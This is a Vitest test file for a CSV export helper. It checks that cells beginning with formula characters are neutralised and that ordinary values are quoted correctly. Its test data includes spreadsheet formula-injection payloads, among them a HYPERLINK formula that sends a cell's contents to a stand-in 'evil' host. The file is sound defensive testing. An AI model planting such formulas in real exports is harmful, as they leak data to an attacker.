import { describe, expect, it } from "vitest";

import { csvCell, toCsv } from "./csv";

describe("csvCell (SEC3-10)", () => {
  it.each(["=HYPERLINK(\"https://evil/?\"&A2,\"x\")", "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "neutralises a formula-triggering cell: %j",
    (value) => {
      const cell = csvCell(value);
      // Quoted cells start with `"'`; unquoted ones with `'`.
      expect(cell.startsWith("'") || cell.startsWith("\"'")).toBe(true);
    },
  );

  it("leaves ordinary values untouched", () => {
    expect(csvCell("user:alice")).toBe("user:alice");
    expect(csvCell(42)).toBe("42");
    expect(csvCell(true)).toBe("true");
    expect(csvCell(null)).toBe("");
  });

  it("quotes values containing separators, quotes or line breaks", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(csvCell("cr\ronly")).toBe('"cr\ronly"');
  });
});

describe("toCsv", () => {
  it("emits a header row and one CRLF-separated row per record", () => {
    const csv = toCsv([{ id: 1, reason: "=cmd" }], ["id", "reason"]);
    expect(csv).toBe("id,reason\r\n1,'=cmd");
  });
});
